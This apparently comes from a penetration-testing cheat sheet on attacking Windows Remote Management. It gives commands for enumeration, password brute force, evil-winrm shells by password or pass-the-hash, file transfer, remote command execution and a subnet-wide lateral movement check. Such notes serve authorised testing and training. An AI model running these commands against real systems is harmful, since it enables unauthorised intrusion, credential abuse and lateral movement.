# WinRM (5985, 5986)

!!! tip "Start here"
    With valid credentials, connect directly: `evil-winrm -i 10.10.10.10 -u <user> -p <pass>`. Pass-the-hash also works: `evil-winrm -i 10.10.10.10 -u <user> -H <ntlm-hash>`. Port 5985 is HTTP, 5986 is HTTPS — check both.

---

## Enumeration

```bash
nmap -p 5985,5986 10.10.10.10
nxc winrm 10.10.10.10
curl -sk http://10.10.10.10:5985/wsman
```

---

## Brute Force

```bash
nxc winrm 10.10.10.10 -u users.txt -p passwords.txt
```

---

## Shell via evil-winrm

```bash
evil-winrm -i 10.10.10.10 -u <user> -p <pass>
evil-winrm -i 10.10.10.10 -u <user> -H <ntlm-hash>
```

Upload/download files from within the shell:

```
*Evil-WinRM* PS> upload /path/to/local/file C:\destination
*Evil-WinRM* PS> download C:\path\to\remote\file /local/destination
```

---

## Remote Command Execution

```bash
nxc winrm 10.10.10.10 -u <user> -p <pass> -x "whoami"
nxc winrm 10.10.10.10 -u <user> -H <ntlm-hash> -x "ipconfig"
```

!!! tip "Real-world"
    WinRM is enabled by default on Windows Server 2012+ and is commonly used for legitimate remote management. If you have valid domain credentials, always check if they work on WinRM across the entire subnet — `nxc winrm 10.10.10.0/24 -u <user> -p <pass>` is a fast lateral movement check.
